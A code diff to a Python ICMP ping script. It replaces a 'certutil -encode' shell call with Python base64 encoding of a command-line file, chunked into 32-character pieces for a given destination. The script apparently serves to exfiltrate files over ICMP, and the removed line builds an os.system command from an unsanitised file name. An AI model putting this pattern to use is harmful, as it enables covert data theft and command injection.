@@ -68,6 +68,8 @@ import random
 import asyncore
 import os
 import sys
+import base64  
+import StringIO 
 # From /usr/include/linux/icmp.h; your milage may vary.
 ICMP_ECHO_REQUEST = 8 # Seems to be the same on Solaris.
 
@@ -327,7 +329,10 @@ if __name__ == '__main__':
     # Testing
 	file=sys.argv[1]
 	destination = sys.argv[2]
-	os.system("certutil -encode  "+ file +" test.txt")
+	f1 = open(file, "r")
+	f2 = open("test.txt", "w")
+	base64.encode(f1, f2)
+	f2.close()
 	f=open("test.txt", "r")
 	for line in f:	
 		text1= line[0:32]
